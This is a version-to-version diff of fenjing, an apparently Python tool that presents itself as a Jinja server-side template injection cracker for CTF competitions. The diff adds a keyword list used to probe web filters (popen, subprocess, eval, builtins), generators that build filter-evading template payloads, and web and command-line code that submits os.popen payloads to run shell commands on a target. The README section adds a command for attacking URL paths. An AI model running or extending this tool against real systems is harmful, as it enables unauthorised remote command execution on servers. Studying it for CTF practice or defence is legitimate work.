+    full_payload_gen = cracker.crack()
+    if full_payload_gen is None:
         logger.warning("Test form failed...")
         return
-    full_payload_gen, field = result
     cmd_exec_func = partial(
-        cmd_exec,
-        cracker=cracker,
-        field=field,
+        cmd_exec_submitter,
+        submitter=submitter,
         full_payload_gen=full_payload_gen,
     )
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
@@ -266,30 +353,31 @@
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
         headers=parse_headers_cookies(
             headers_list=list(header), cookies=cookies
         ),
     )
-    for page_url, forms in yield_form(requester, url):
-        for form in forms:
-            cracker = FormCracker(
-                url=page_url,
-                form=form,
-                requester=requester,
-                detect_mode=detect_mode,
-            )
-            result = cracker.crack()
-            if result is None:
+    url_forms = (
+        (page_url, form)
+        for (page_url, forms) in yield_form(requester, url)
+        for form in forms
+    )
+    for page_url, form in url_forms:
+        for input_field in form["inputs"]:
+            submitter = FormSubmitter(page_url, form, input_field, requester)
+            cracker = Cracker(submitter, detect_mode=detect_mode)
+            if not cracker.has_respond():
+                continue
+            full_payload_gen = cracker.crack()
+            if full_payload_gen is None:
                 continue
-            full_payload_gen, field = result
             cmd_exec_func = partial(
-                cmd_exec,
-                cracker=cracker,
-                field=field,
+                cmd_exec_submitter,
+                submitter=submitter,
                 full_payload_gen=full_payload_gen,
             )
             if exec_cmd == "":
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
```

### Comparing `fenjing-0.4.6.1/fenjing/colorize.py` & `fenjing-0.4.7/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/config_payload.py` & `fenjing-0.4.7/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/const.py` & `fenjing-0.4.7/fenjing/const.py`

 * *Files 8% similar despite different names*

```diff
@@ -7,15 +7,15 @@
 
 LITERAL = "literal"
 UNSATISFIED = "unsatisfied"
 WITH_CONTEXT_VAR = "with_context_var"
 ZERO = "zero"
 POSITIVE_INTEGER = "positive_integer"
 INTEGER = "integer"
-STRING_STRING_CONCNAT = "string_string_concat"
+STRING_STRING_CONCAT = "string_string_concat"
 STRING_PERCENT = "string_percent"
 STRING_PERCENT_LOWER_C = "string_percent_lower_c"
 STRING_UNDERLINE = "string_underline"
 STRING_LOWERC = "string_lower_c"
 STRING_MANY_PERCENT_LOWER_C = "string_many_percent_lower_c"
 STRING_MANY_FORMAT_C = "string_many_format_c"
 CHAR = "char"
@@ -73,7 +73,46 @@
 APICODE_OK = 200
 APICODE_WRONG_INPUT = 401
 
 # 程序检测的目标模式：快速或精确
 
 DETECT_MODE_FAST = "fast"
 DETECT_MODE_ACCURATE = "accurate"
+
+DANGEROUS_KEYWORDS = [
+    '"',
+    "'",
+    "+",
+    ".",
+    "0",
+    "1",
+    "2",
+    "=",
+    "[",
+    "_",
+    "%",
+    "attr",
+    "builtins",
+    "chr",
+    "class",
+    "config",
+    "eval",
+    "global",
+    "include",
+    "lipsum",
+    "mro",
+    "namespace",
+    "open",
+    "pop",
+    "popen",
+    "read",
+    "request",
+    "self",
+    "subprocess",
+    "system",
+    "url_for",
+    "value",
+    "{{",
+    "|",
+    "}}",
+    "~",
+]
```

### Comparing `fenjing-0.4.6.1/fenjing/context_vars.py` & `fenjing-0.4.7/fenjing/context_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/form.py` & `fenjing-0.4.7/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/full_payload_gen.py` & `fenjing-0.4.7/fenjing/full_payload_gen.py`

 * *Files 2% similar despite different names*

```diff
@@ -14,15 +14,15 @@
 )
 from .const import (
     CALLBACK_PREPARE_FULLPAYLOADGEN,
     CALLBACK_GENERATE_FULLPAYLOAD,
     DETECT_MODE_ACCURATE,
 )
 
-logger = logging.getLogger("shell_payload")
+logger = logging.getLogger("full_payload_gen")
 
 
 def get_outer_pattern(
     waf_func: Callable,
 ) -> Union[Tuple[str, bool], Tuple[None, None]]:
     """根据WAF函数获取payload最外层的结构，一般为双花括号
 
@@ -230,9 +230,14 @@
             {
                 "gen_type": gen_type,
                 "args": args,
                 "payload": payload,
                 "will_print": self.will_print,
             },
         )
-
+        if not self.will_print:
+            logger.warning(
+                "use %s, which %s your result!",
+                colored("blue", self.outer_pattern),
+                colored("red", "will not print"),
+            )
         return (payload, self.will_print)
```

### Comparing `fenjing-0.4.6.1/fenjing/payload_gen.py` & `fenjing-0.4.7/fenjing/payload_gen.py`

 * *Files 4% similar despite different names*

```diff
@@ -116,23 +116,24 @@
         if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
             logger.error("Unknown type: %s", gen_type)
             return None
 
         gens = req_gens[gen_type].copy()
         gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
-            ret = self.generate_by_list(gen(self.context, *args))
+            gen_ret: ReqGenReturn = gen(self.context, *args)
+            ret = self.generate_by_list(gen_ret)
             if ret is None:
                 if hashable(gen_req):
                     self.cache[gen_req] = ret
                 continue
             result = ret[0]
             self.callback(
                 CALLBACK_GENERATE_PAYLOAD,
-                {"gen_type": gen_type, "args": args, "payload": result},
+                {"gen_type": gen_type, "args": args, "gen_ret": gen_ret, "payload": result},
             )
             # 为了日志的简洁，仅打印一部分日志
             if gen_type in (INTEGER, STRING) and result != str(args[0]):
                 logger.info(
                     "{great}, {gen_type}({args_repl}) can be {result}".format(
                         great=colored("green", "Great"),
                         gen_type=colored("yellow", gen_type, bold=True),
@@ -162,15 +163,15 @@
                 )
 
             if hashable(gen_req):
                 self.cache[gen_req] = ret
             self.used_count[gen.__name__] += 1
             return ret
 
-        logger.warning(
+        logger.info(
             "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
                 failed=colored("red", "failed"),
                 gen_type=gen_type,
                 args_repl=", ".join(repr(arg) for arg in args),
             )
         )
         return None
@@ -551,19 +552,53 @@
 
 
 @req_gen
 def gen_string_percent_lower_c_concat(context):
     return [
         (LITERAL, "("),
         (STRING_PERCENT,),
-        (STRING_STRING_CONCNAT,),
+        (STRING_STRING_CONCAT,),
         (STRING_LOWERC,),
         (LITERAL, ")"),
     ]
 
+@req_gen
+def gen_string_percent_lower_c_dictjoin(context):
+    # "(dict([('%',x),('c',x)])|join)"
+    return [
+        (LITERAL, "(dict([("),
+        (STRING_PERCENT, ),
+        (LITERAL, ",x),("),
+        (STRING_LOWERC, ),
+        (LITERAL, ",x)])|join)")
+    ]
+
+
+@req_gen
+def gen_string_percent_lower_c_listjoin(context):
+    # "(['%','c']|join)"
+    return [
+        (LITERAL, "(["),
+        (STRING_PERCENT, ),
+        (LITERAL, ","),
+        (STRING_LOWERC, ),
+        (LITERAL, "]|join)")
+    ]
+
+@req_gen
+def gen_string_percent_lower_c_tuplejoin(context):
+    # "(('%','c')|join)"
+    return [
+        (LITERAL, "(("),
+        (STRING_PERCENT, ),
+        (LITERAL, ","),
+        (STRING_LOWERC, ),
+        (LITERAL, ")|join)")
+    ]
+
 
 @req_gen
 def gen_string_percent_lower_c_cycler(context):
     # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
     return [
         (LITERAL, "(cycler|pprint|list|pprint|urlencode|batch("),
         (INTEGER, 10),
@@ -585,15 +620,15 @@
 def gen_string_many_percent_lower_c_concat(context, count: int):
     l = [
         [
             (STRING_PERCENT_LOWER_C,),
         ]
         if i == 0
         else [
-            (STRING_STRING_CONCNAT,),
+            (STRING_STRING_CONCAT,),
             (STRING_PERCENT_LOWER_C,),
         ]
         for i in range(count)
     ]
     return [item for lst in l for item in lst]
 
 
@@ -756,15 +791,15 @@
             if value == c:
                 return [(LITERAL, pattern.replace("INDEX", str(index)))]
     return [(UNSATISFIED,)]
 
 
 @req_gen
 def gen_char_dict(context, c):
-    if not re.match("[0-9A-Za-z]", c):
+    if not re.match("[A-Za-z]", c):
         return [(UNSATISFIED,)]
     return [(LITERAL, f"(dict({c}=x)|join)")]
 
 
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
@@ -825,17 +860,17 @@
 def gen_string_removedunder(context: dict, value: str):
     if not re.match("^__[A_Za-z0-9_]+__$", value):
         return [(UNSATISFIED,)]
     return [
         (STRING_UNDERLINE,),
         (LITERAL, "*"),
         (INTEGER, 2),
-        (STRING_STRING_CONCNAT,),
+        (STRING_STRING_CONCAT,),
         (STRING, value[2:-2]),
-        (STRING_STRING_CONCNAT,),
+        (STRING_STRING_CONCAT,),
         (STRING_UNDERLINE,),
         (LITERAL, "*"),
         (INTEGER, 2),
     ]
 
 
 @req_gen
@@ -885,15 +920,15 @@
 def gen_string_splitdictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
     parts = [value[i : i + 3] for i in range(0, len(value), 3)]
     req = []
     for i, part in enumerate(parts):
         if i != 0:
-            req.append((STRING_STRING_CONCNAT,))
+            req.append((STRING_STRING_CONCAT,))
         req.append((LITERAL, "(dict({}=x)|join)".format(part)))
     return req
 
 
 @req_gen
 def gen_string_splitdictjoin2(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
@@ -921,15 +956,15 @@
     ]
 
 
 @req_gen
 def gen_string_chars(context: dict, value: str):
     ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
     for c in value[1:]:
-        ans.append((STRING_STRING_CONCNAT,))
+        ans.append((STRING_STRING_CONCAT,))
         ans.append((CHAR, c))
     ans.append(
         (LITERAL, ")"),
     )
     return ans
```

### Comparing `fenjing-0.4.6.1/fenjing/requester.py` & `fenjing-0.4.7/fenjing/requester.py`

 * *Files 7% similar despite different names*

```diff
@@ -38,15 +38,15 @@
         if headers:
             self.session.headers.update(headers)
 
     def request_once(self, **kwargs):
         """发出一次网络请求，失败时返回None
 
         Returns:
-            Response | None: 返回的响应
+            Union[Response, None]: 返回的响应
         """
         duration = time.perf_counter() - self.last_request_time
         if duration < self.interval:
             time.sleep(self.interval - duration)
 
         if "timeout" not in kwargs:
             kwargs["timeout"] = self.timeout
@@ -64,14 +64,14 @@
         self.last_request_time = time.perf_counter()
         return resp
 
     def request(self, **kwargs):
         """发送请求，自动重试
 
         Returns:
-            Response | None: 响应
+            Union[Response, None]: 响应
         """
         for _ in range(self.retry_times - 1):
             resp = self.request_once(**kwargs)
-            if resp:
+            if resp is not None:
                 return resp
         return self.request_once(**kwargs)
```

### Comparing `fenjing-0.4.6.1/fenjing/scan_url.py` & `fenjing-0.4.7/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/shell_payload.py` & `fenjing-0.4.7/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/templates/index.html` & `fenjing-0.4.7/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/fenjing/waf_func_gen.py` & `fenjing-0.4.7/fenjing/waf_func_gen.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,185 +1,137 @@
 """根据指定的表单生成对应的WAF函数
 
 """
 
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
-from typing import Dict, Callable, Union
+from typing import Dict, Callable, Union, List
 import random
 import string
+from copy import copy
 
-from .const import (
-    CALLBACK_SUBMIT,
-    DETECT_MODE_ACCURATE,
-)
-from .form import fill_form, Form
-from .requester import Requester
+from .const import DETECT_MODE_ACCURATE, DETECT_MODE_FAST, DANGEROUS_KEYWORDS
+from .submitter import Submitter
 from .colorize import colored
 
 
 logger = logging.getLogger("waf_func_gen")
 Result = namedtuple("Result", "payload_generate_func input_field")
 
-dangerous_keywords = [
-    '"',
-    "'",
-    "+",
-    ".",
-    "0",
-    "1",
-    "2",
-    "=",
-    "[",
-    "_",
-    "%",
-    "attr",
-    "builtins",
-    "chr",
-    "class",
-    "config",
-    "eval",
-    "global",
-    "include",
-    "lipsum",
-    "mro",
-    "namespace",
-    "open",
-    "pop",
-    "popen",
-    "read",
-    "request",
-    "self",
-    "subprocess",
-    "system",
-    "url_for",
-    "value",
-    "{{",
-    "|",
-    "}}",
-    "~",
-]
+dangerous_keywords = copy(DANGEROUS_KEYWORDS)
 
 random.shuffle(dangerous_keywords)
+render_error_keywords = ["TemplateSyntaxError", "Internal Server Error"]
 
 
 class WafFuncGen:
     """
-    根据指定的表单生成对应的WAF函数
+    根据指定的Submitter(表单submitter或者路径submitter)生成对应的WAF函数
+    其会使用一系列经常被waf的payload进行测试，然后根据返回页面的哈希判断其他payload是否被waf
     """
 
     def __init__(
         self,
-        url: str,
-        form: Form,
-        requester: Requester,
+        submitter: Submitter,
         callback: Union[Callable[[str, Dict], None], None] = None,
         detect_mode: str = DETECT_MODE_ACCURATE,
     ):
-        """根据指定的表单生成对应的WAF函数
-
-        Args:
-            url (str): form所在的url.
-            form (dict): 解析后的form元素
-            requester (Requester): 用于发出请求的requester，为None时自动构造.
-            callback (Union[Callable[[str, Dict], None], None], optional):
-                callback函数，默认为None
-            detect_mode (str): 测试WAF页面hash的模式
-                "fast": 一次发送多个危险的关键字
-                "accurate": 一次发送一个危险的关键字
-        """
-        self.url = url
-        self.form = form
-        self.req = requester
+        self.subm = submitter
         self.callback: Callable[[str, Dict], None] = (
             callback if callback else (lambda x, y: None)
         )
         self.detect_mode = detect_mode
 
-    def submit(self, inputs: dict):
-        """根据inputs提交form
-
-        Args:
-            inputs (dict): 需要提交的input
-
-        Returns:
-            requests.Response: 返回的reponse元素
-        """
-        all_length = sum(len(v) for v in inputs.values())
-        if all_length > 2048 and self.form["method"] == "GET":
-            logger.warning(
-                "inputs are extremely long (len=%d) "
-                + "that the request might fail",
-                all_length,
-            )
-        resp = self.req.request(**fill_form(self.url, self.form, inputs))
-
-        self.callback(
-            CALLBACK_SUBMIT,
-            {
-                "form": self.form,
-                "inputs": inputs,
-                "response": resp,
-            },
-        )
-
-        return resp
-
-    def waf_page_hash(self, input_field: str):
+    def waf_page_hash(self):
         """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash
 
-        Args:
-            input_field (str): 需要测试的input
-
         Returns:
             List[int]: payload被waf后页面对应的hash
         """
-        resps = {}
-        test_keywords = (
-            dangerous_keywords
-            if self.detect_mode == DETECT_MODE_ACCURATE
-            else [
-                "".join(dangerous_keywords[i: i + 3])  # flake8: noqa
-                for i in range(0, len(dangerous_keywords), 3)
-            ]
-        )
+        composed_test_keywords = [
+            "".join(dangerous_keywords[i: i + 3])  # flake8: noqa
+            for i in range(0, len(dangerous_keywords), 3)
+        ]
+        test_keywords = composed_test_keywords
+        if self.detect_mode == DETECT_MODE_ACCURATE:
+            test_keywords += dangerous_keywords
+        hashes: List[int] = []
         for keyword in test_keywords:
             logger.info(
                 "Testing dangerous keyword %s",
                 colored("yellow", repr(keyword * 2)),
             )
-            resps[keyword] = self.submit({input_field: keyword * 2})
-        hashes = [
-            hash(r.text)
-            for keyword, r in resps.items()
-            if r is not None
-            and r.status_code != 500
-            and keyword not in r.text
-        ]
-        return [k for k, v in Counter(hashes).items() if v >= 3]
+            result = self.subm.submit(keyword * 2)
+            if result is None:
+                logger.info(
+                    "Submit %s for %s",
+                    colored("yellow", "failed"),
+                    colored("yellow", repr(keyword * 2)),
+                )
+                continue
+            status_code, text = result
+            if status_code == 500:
+                continue
+            hashes.append(hash(text))
 
-    def generate(self, input_field: str) -> Callable:
-        """生成WAF函数
+        return [k for k, v in Counter(hashes).items() if v >= 2]
 
-        Args:
-            input_field (str): 表格项
+    def generate(self) -> Callable:
+        """生成WAF函数
 
         Returns:
             Callable: WAF函数
         """
-        waf_hashes = self.waf_page_hash(input_field)
+        waf_hashes = self.waf_page_hash()
+        # 随着检测payload一起提交的附加内容
+        # content: 内容本身，passed: 内容是否确认可以通过waf
+        extra_content, extra_passed = (
+            "".join(random.choices(string.ascii_lowercase, k=6)),
+            False,
+        )
 
         @lru_cache(1000)
         def waf_func(value):
-            extra_content = "".join(
-                random.choices(string.ascii_lowercase, k=6)
-            )
-            resp = self.submit({input_field: extra_content + value})
-            assert resp is not None
-            if hash(resp.text) in waf_hashes:  # 页面的hash和waf页面的hash相同
+            nonlocal extra_content, extra_passed
+            for _ in range(5):
+                result = self.subm.submit(extra_content + value)
+                if result is None:
+                    return False
+                # status_code, text = result
+
+                # 遇到500时，判断是否是Jinja渲染错误，是则返回True
+                if result.status_code == 500:
+                    return any(
+                        w in result.text for w in render_error_keywords
+                    )
+                # 产生回显
+                if extra_content in result.text:
+                    return True
+                # 页面的hash和waf页面的hash不相同
+                if hash(result.text) not in waf_hashes:
+                    return True
+                # 页面的hash和waf的相同，但是用户要求检测模式为快速
+                # 因此我们选择直接返回False
+                if self.detect_mode == DETECT_MODE_FAST:
+                    return False
+                # 如果extra_content之前检测过，则可以确定不是它产生的问题，返回False
+                if extra_passed:
+                    return False
+                # 检测是否是extra_content导致的WAF
+                # 如果是的话更换extra_content并重新检测
+                extra_content_result = self.subm.submit(extra_content)
+                if (
+                    extra_content_result is not None
+                    and extra_content_result.status_code != 500
+                    and hash(extra_content_result.text) in waf_hashes
+                ):
+                    extra_content = "".join(
+                        random.choices(string.ascii_lowercase, k=6)
+                    )
+                    continue
+                extra_passed = True
                 return False
-            if resp.status_code == 500:  # Jinja渲染错误
-                return True
-            return extra_content in resp.text  # 产生回显
+            # 五次检测都失败，我们选择直接返回False
+            return False
 
         return waf_func
```

### Comparing `fenjing-0.4.6.1/fenjing/webui.py` & `fenjing-0.4.7/fenjing/webui.py`

 * *Files 7% similar despite different names*

```diff
@@ -1,29 +1,31 @@
 # pylint: skip-file
 # flake8: noqa
 from flask import Flask, render_template, request, jsonify
-
+from typing import Union
 import logging
 import threading
 import uuid
 from urllib.parse import urlparse
 
-from .form import get_form
-from .form_cracker import FormCracker
+from .form import get_form, Form
+from .cracker import Cracker
+from .submitter import Submitter, FormSubmitter
+from .full_payload_gen import FullPayloadGen
 from .requester import Requester
 from .const import (
     CALLBACK_GENERATE_FULLPAYLOAD,
     CALLBACK_GENERATE_PAYLOAD,
     CALLBACK_PREPARE_FULLPAYLOADGEN,
     CALLBACK_SUBMIT,
     CALLBACK_TEST_FORM_INPUT,
     APICODE_OK,
     APICODE_WRONG_INPUT,
     DEFAULT_USER_AGENT,
-    OS_POPEN_READ
+    OS_POPEN_READ,
 )
 
 logger = logging.getLogger("webui")
 app = Flask(__name__)
 tasks = {}
 
 
@@ -64,17 +66,22 @@
             "请求{req}对应的payload可以是{payload}".format(
                 req=f"{data['gen_type']}({', '.join(repr(arg) for arg in data['args'])})",
                 payload=payload_repr,
             )
         )
 
     def callback_submit(self, data):
-        self.flash_messages.append(
-            f"提交表单完成，返回值为{data['response'].status_code}，输入为{data['inputs']}，表单为{data['form']}"
-        )
+        if data.get("type", "form"):
+            self.flash_messages.append(
+                f"提交表单完成，返回值为{data['response'].status_code}，输入为{data['inputs']}，表单为{data['form']}"
+            )
+        else:
+            self.flash_messages.append(
+                f"提交payload完成，返回值为{data['response'].status_code}，提交payload为{data['payload']}"
+            )
 
     def callback_test_form_input(self, data):
         if not data["ok"]:
             return
         testsuccess_msg = (
             "payload测试成功！" if data["test_success"] else "payload测试失败。"
         )
@@ -91,69 +98,87 @@
             CALLBACK_GENERATE_PAYLOAD: self.callback_generate_payload,
             CALLBACK_SUBMIT: self.callback_submit,
             CALLBACK_TEST_FORM_INPUT: self.callback_test_form_input,
         }.get(callback_type, default_handler)(data)
 
 
 class CrackTaskThread(threading.Thread):
-    def __init__(self, taskid, url, form, interval):
+    def __init__(self, taskid, url, form: Form, interval):
         super().__init__()
-        self.result = None
+        self.success = False
         self.taskid = taskid
         self.form = form
-
+        self.url = url
         self.flash_messages = []
         self.messages = []
         self.callback = CallBackLogger(self.flash_messages, self.messages)
-
-        self.cracker = FormCracker(
-            url=url,
-            form=form,
-            requester=Requester(
-                interval=interval, user_agent=DEFAULT_USER_AGENT
-            ),
-            callback=self.callback,
+        self.submitter: Union[Submitter, None] = None
+        self.cracker: Union[Cracker, None]
+        self.requester = Requester(
+            interval=interval, user_agent=DEFAULT_USER_AGENT
         )
 
     def run(self):
-        self.messages.append(f"开始分析WAF")
-        self.result = self.cracker.crack()
-        if self.result:
-            self.messages.append(f"WAF已绕过，现在可以执行Shell指令了")
-        else:
+        for input_field in self.form["inputs"]:
+            self.messages.append(f"开始分析表单项{input_field}")
+            self.submitter = FormSubmitter(
+                self.url,
+                self.form,
+                input_field,
+                self.requester,
+                self.callback,
+            )
+            self.cracker = Cracker(self.submitter, self.callback)
+            if not self.cracker.has_respond():
+                continue
+            self.full_payload_gen = self.cracker.crack()
+            if self.full_payload_gen:
+                self.messages.append(f"WAF已绕过，现在可以执行Shell指令了")
+                self.success = True
+                break
+            continue
+        if not self.full_payload_gen:
             self.messages.append(f"WAF绕过失败")
 
 
 class InteractiveTaskThread(threading.Thread):
-    def __init__(self, taskid, cracker, field, full_payload_gen, cmd):
+    def __init__(
+        self,
+        taskid: str,
+        submitter: Submitter,
+        full_payload_gen: FullPayloadGen,
+        cmd: str,
+    ):
         super().__init__()
         self.taskid = taskid
-        self.cracker = cracker
-        self.field = field
+        self.submitter = submitter
         self.full_payload_gen = full_payload_gen
         self.cmd = cmd
 
         self.flash_messages = []
         self.messages = []
         self.callback = CallBackLogger(self.flash_messages, self.messages)
 
-        self.cracker.callback = self.callback
+        self.submitter.callback = self.callback
         self.full_payload_gen.callback = self.callback
 
     def run(self):
         self.messages.append(f"开始生成payload")
         payload, will_print = self.full_payload_gen.generate(
             OS_POPEN_READ, self.cmd
         )
+        if not payload:
+            self.messages.append(f"payload生成失败")
+            return
         if not will_print:
             self.messages.append(f"此payload不会产生回显")
-        r = self.cracker.submit({self.field: payload})
-        assert r is not None
+        resp = self.submitter.submit(payload)
+        assert resp is not None
         self.messages.append(f"提交payload的回显如下：")
-        self.messages.append(r.text)
+        self.messages.append(resp.text)
 
 
 @app.route("/")
 def index():
     return render_template("index.html")
 
 
@@ -170,23 +195,20 @@
     task.start()
     tasks[taskid] = task
     return taskid
 
 
 def create_interactive_id(cmd, last_task):
     assert cmd != "", "wrong param"
-    cracker, field, full_payload_gen = (
-        last_task.cracker,
-        last_task.result.input_field,
-        last_task.result.full_payload_gen,
+    submitter, full_payload_gen = (
+        last_task.submitter,
+        last_task.full_payload_gen,
     )
     taskid = uuid.uuid4().hex
-    task = InteractiveTaskThread(
-        taskid, cracker, field, full_payload_gen, cmd
-    )
+    task = InteractiveTaskThread(taskid, submitter, full_payload_gen, cmd)
     task.daemon = True
     task.start()
     tasks[taskid] = task
     return taskid
 
 
 @app.route(
@@ -230,15 +252,15 @@
         if not isinstance(last_task, CrackTaskThread):
             return jsonify(
                 {
                     "code": APICODE_WRONG_INPUT,
                     "message": f"last_task_id not found: {last_task_id}",
                 }
             )
-        if last_task.result is None:
+        if not last_task.success :
             return jsonify(
                 {
                     "code": APICODE_WRONG_INPUT,
                     "message": f"specified last_task failed: {last_task_id}",
                 }
             )
         taskid = create_interactive_id(cmd, last_task)
@@ -268,15 +290,15 @@
         return jsonify(
             {
                 "code": APICODE_OK,
                 "taskid": task.taskid,
                 "done": not task.is_alive(),
                 "messages": task.messages,
                 "flash_messages": task.flash_messages,
-                "success": task.result.input_field if task.result else None,
+                "success": task.success,
             }
         )
     elif isinstance(task, InteractiveTaskThread):
         return jsonify(
             {
                 "code": APICODE_OK,
                 "taskid": task.taskid,
```

### Comparing `fenjing-0.4.6.1/fenjing.egg-info/PKG-INFO` & `fenjing-0.4.7/fenjing.egg-info/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.6.1
+Version: 0.4.7
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -23,14 +23,15 @@
 
 ## 主要特性
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
 - 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
+- 支持攻击对应的HTML表单或HTML路径
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -136,14 +137,18 @@
   - 从网站中根据form元素提取出所有的表单并攻击
   - 扫描成功后会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing scan --url 'http://xxx/'`
 - crack: 对某个特定的表单进行攻击
   - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
+- crack-path: 对某个特定的路径进行攻击
+  - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
+  - 参数大致上和crack相同，但是只需要提供对应的路径
+  - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
   扫描指定的网站
 
@@ -185,14 +190,29 @@
   -i, --inputs TEXT   form的参数，以逗号分隔
   --interval FLOAT    每次请求的间隔
   --detect-mode TEXT  分析模式，可为accurate或fast
   --user-agent TEXT   请求时使用的User Agent
   --header TEXT       请求时使用的Headers
   --cookies TEXT      请求时使用的Cookie
   --help              Show this message and exit.
+
+Usage: python -m fenjing crack-path [OPTIONS]
+
+  攻击指定的路径
+
+Options:
+  -u, --url TEXT       需要攻击的URL
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   分析模式，可为accurate或fast
+  --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
+  --help               Show this message and exit.
+
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
@@ -218,9 +238,8 @@
 
 ```
 
 其他使用例可以看[这里](examples.md)
 
 ## 项目结构
 
-[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)
-
